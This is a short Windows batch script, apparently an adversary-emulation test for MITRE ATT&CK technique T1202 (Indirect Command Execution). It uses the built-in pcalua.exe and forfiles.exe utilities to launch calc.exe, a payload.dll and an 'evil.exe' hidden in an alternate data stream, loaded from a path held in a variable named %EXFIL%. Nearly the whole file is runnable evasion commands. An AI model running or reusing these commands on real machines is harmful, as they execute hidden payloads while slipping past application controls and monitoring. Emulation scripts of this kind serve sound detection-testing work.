@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Indirect Command Execution (T1202)
ECHO.
ECHO [+] Leveraging 'PCALUA.EXE' to execute binaries
ECHO -------------------------------------------------------------------
pcalua.exe -a calc.exe
pcalua.exe -a %EXFIL%payload.dll
pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
ECHO.

ECHO [+] Leveraging 'FORFILES.EXE' to execute binaries
ECHO -------------------------------------------------------------------
forfiles /p C:\windows\system32 /m notepad.exe /c calc.exe
forfiles /p C:\windows\system32 /m notepad.exe /c "%EXFIL%normal.dll:evil.exe"
ECHO.
